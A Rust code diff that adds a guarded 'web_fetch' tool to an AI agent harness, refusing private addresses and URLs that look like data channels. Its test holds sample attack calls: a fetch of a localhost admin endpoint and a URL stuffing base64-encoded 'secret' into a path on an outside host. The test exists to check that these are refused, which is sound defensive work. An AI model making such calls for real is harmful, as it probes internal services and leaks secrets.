@@ -76,6 +76,8 @@ const OUTCOME_CHARS: usize = 4_000;
 
 #[path = "explore.rs"]
 mod explore;
+#[path = "fetch.rs"]
+mod fetch;
 use explore::{run_explore, ExploreLimits, ProviderLink};
 
 fn now_ms() -> u128 {
@@ -450,6 +452,12 @@ enum AgentCall {
     },
     CompleteTask {
         summary: String,
+    },
+    /// Read one public web page as text.
+    WebFetch {
+        id: String,
+        url: String,
+        offset: usize,
     },
     /// Hand a focused read-only question to an explorer sub-agent.
     Explore {
@@ -1578,7 +1586,7 @@ fn build_state_message(
                 "When the plan is fully done, call complete_task. Gates then verify your work; false completion claims fail the gates.",
                 "Evidence from older turns stays in the run ledger; the digest below carries the recent truth.",
             ],
-            "tools": ["update_plan", "read_file", "create_file", "edit_file", "search_files", "glob_files", "apply_patch", "run_command", "web_search", "explore", "complete_task"],
+            "tools": ["update_plan", "read_file", "create_file", "edit_file", "search_files", "glob_files", "apply_patch", "run_command", "web_search", "web_fetch", "explore", "complete_task"],
         },
         "brief": {"task": brief.task, "created_at_ms": brief.created_at_ms},
         "project_instructions": project.map(|p| json!({
@@ -1663,6 +1671,12 @@ fn offered_tool_specs() -> Vec<ToolSpec> {
         ToolSpec::new(
             "web_search",
             "Search the public web for grounded facts.",
+            false,
+            false,
+        ),
+        ToolSpec::new(
+            "web_fetch",
+            "Read one public web page as text (robots-aware, private addresses refused).",
             false,
             false,
         ),
@@ -1819,6 +1833,7 @@ fn gemini_tool_definitions() -> Value {
         {"name":"glob_files","description":"Find workspace files by glob pattern (e.g. **/*.rs), newest first. Skips build output and .gitignore'd paths.","parameters":{"type":"OBJECT","properties":{"pattern":{"type":"STRING"},"path":{"type":"STRING"},"max_results":{"type":"INTEGER"}},"required":["pattern"]}},
         {"name":"run_command","description":"Run an allowed command inside the workspace. Requires trusted approval.","parameters":{"type":"OBJECT","properties":{"argv":{"type":"ARRAY","items":{"type":"STRING"}},"cwd":{"type":"STRING"},"timeout_ms":{"type":"INTEGER"}},"required":["argv"]}},
         {"name":"web_search","description":"Search the public web for grounded facts. Returns ranked results with URLs.","parameters":{"type":"OBJECT","properties":{"query":{"type":"STRING"},"max_results":{"type":"INTEGER"}},"required":["query"]}},
+        {"name":"web_fetch","description":"Read one public web page (http/https) as plain text, e.g. docs or an issue you already have the URL for. Robots.txt, private addresses and data-carrying URLs are refused. Long pages return next_offset; call again with offset to continue.","parameters":{"type":"OBJECT","properties":{"url":{"type":"STRING"},"offset":{"type":"INTEGER","description":"character offset to continue from"}},"required":["url"]}},
         {"name":"explore","description":"Delegate a focused read-only question about the workspace (e.g. where something is defined, how a module works) to an explorer sub-agent that can only read, search and glob. Returns one findings report with file:line references; its raw tool output stays out of your context.","parameters":{"type":"OBJECT","properties":{"task":{"type":"STRING","description":"the question, with any paths or names you already know"}},"required":["task"]}},
         {"name":"complete_task","description":"Declare the task finished. Harness gates verify the claim before the run completes.","parameters":{"type":"OBJECT","properties":{"summary":{"type":"STRING"}},"required":["summary"]}}
     ]}])
@@ -2117,6 +2132,24 @@ fn decode_gemini_calls(response: &str) -> Result<DecodedCalls, String> {
                     raw,
                 ));
             }
+            "web_fetch" => match args.get("url").and_then(Value::as_str) {
+                Some(url) => calls.push((
+                    AgentCall::WebFetch {
+                        id,
+                        url: url.into(),
+                        offset: args.get("offset").and_then(Value::as_u64).unwrap_or(0) as usize,
+                    },
+                    raw,
+                )),
+                None => calls.push((
+                    AgentCall::BadCall {
+                        name: "web_fetch".into(),
+                        id,
+                        error: "web_fetch missing url".into(),
+                    },
+                    raw,
+                )),
+            },
             "explore" => match args.get("task").and_then(Value::as_str) {
                 Some(task) if !task.trim().is_empty() => calls.push((
                     AgentCall::Explore {
@@ -2220,6 +2253,17 @@ fn decode_named_call(
                 Some(raw),
             ),
             None => bad("web_search missing query".into()),
+        },
+        "web_fetch" => match args.get("url").and_then(Value::as_str) {
+            Some(url) => (
+                AgentCall::WebFetch {
+                    id,
+                    url: url.into(),
+                    offset: args.get("offset").and_then(Value::as_u64).unwrap_or(0) as usize,
+                },
+                Some(raw),
+            ),
+            None => bad("web_fetch missing url".into()),
         },
         "explore" => match args.get("task").and_then(Value::as_str) {
             Some(task) if !task.trim().is_empty() => (
@@ -2524,6 +2568,53 @@ fn execute_turn<S: SecretStore + 'static, T: Transport + 'static>(
                     json!({"functionCall":{"name":"web_search","args":{"query": query}}}),
                 );
                 response_parts.push(function_response(protocol, "web_search", &id, ok, &content));
+            }
+            AgentCall::WebFetch { id, url, offset } => {
+                let allowed = ctx
+                    .brief
+                    .allowed_tools
+                    .as_ref()
+                    .is_none_or(|a| a.iter().any(|t| t == "web_fetch"));
+                let (ok, content) = if !allowed {
+                    (
+                        false,
+                        "tool web_fetch is not enabled for this run's role; use only the tools listed in your tool contract".to_string(),
+                    )
+                } else {
+                    match fetch::vet_url(&url) {
+                        Err(reason) => (false, format!("refused: {reason}")),
+                        Ok(parsed) => {
+                            let resp = fetch::fetch(&parsed);
+                            fetch::render(&resp, offset)
+                        }
+                    }
+                };
+                if let Some(l) = ledger.as_mut() {
+                    l.append("web_fetch", json!({"url": url, "offset": offset, "ok": ok}));
+                }
+                crate::memory::record(
+                    &mut cp.observations,
+                    crate::memory::Observation::new(
+                        cp.step,
+                        "web_fetch",
+                        Some(url.clone()),
+                        ok,
+                        &content,
+                    ),
+                );
+                out.progress |= ok;
+                out.digest_actions.push(DigestAction {
+                    tool: "web_fetch".into(),
+                    ok,
+                    target: Some(url.chars().take(160).collect()),
+                    error_kind: (!ok).then(|| "fetch_failed".to_string()),
+                });
+                push_model_part(
+                    &mut model_parts,
+                    raw,
+                    json!({"functionCall":{"name":"web_fetch","args":{"url": url, "offset": offset}}}),
+                );
+                response_parts.push(function_response(protocol, "web_fetch", &id, ok, &content));
             }
             AgentCall::Explore { id, task } => {
                 if let Some(allowed) = &ctx.brief.allowed_tools {
@@ -3226,6 +3317,7 @@ fn plan_gate<S: SecretStore + 'static, T: Transport + 'static>(
                 AgentCall::WebSearch { .. } => Some("web_search".to_string()),
                 AgentCall::CompleteTask { .. } => Some("complete_task".to_string()),
                 AgentCall::Explore { .. } => Some("explore".to_string()),
+                AgentCall::WebFetch { .. } => Some("web_fetch".to_string()),
             };
             if let Some(name) = name {
                 disallowed.push(name);
@@ -4536,6 +4628,31 @@ mod tests {
             serde_json::from_str(first["contents"][0]["parts"][0]["text"].as_str().unwrap())
                 .unwrap();
         assert!(state0["earlier_observations"].is_null());
+    }
+
+    #[test]
+    fn web_fetch_refuses_private_and_data_channel_urls() {
+        let tmp = tempfile::tempdir().unwrap();
+        let local =
+            json!({"functionCall":{"name":"web_fetch","args":{"url":"http://127.0.0.1:9/admin"}}});
+        let smuggle = json!({"functionCall":{"name":"web_fetch","args":{"url": format!("https://x.org/{}", "c2VjcmV0".repeat(12))}}});
+        let svc = Arc::new(service(
+            tmp.path(),
+            Script::new(vec![
+                call_turn(vec![local, smuggle]),
+                call_turn(vec![complete_call("done")]),
+            ]),
+        ));
+        let snap = svc.begin("fetch check", "gemini", Some(budgets())).unwrap();
+        auto_approve(svc.clone(), snap.id.clone());
+        wait_terminal(&svc, &snap.id, 60_000);
+        let posts = svc.service().transport().seen();
+        assert!(posts[1].contains("unsafe_address"), "{}", posts[1]);
+        assert!(posts[1].contains("possible data channel"), "{}", posts[1]);
+        assert!(scoped_tools_for(Role::Adversary)
+            .0
+            .iter()
+            .any(|s| s.name == "web_fetch"));
     }
 
     #[test]
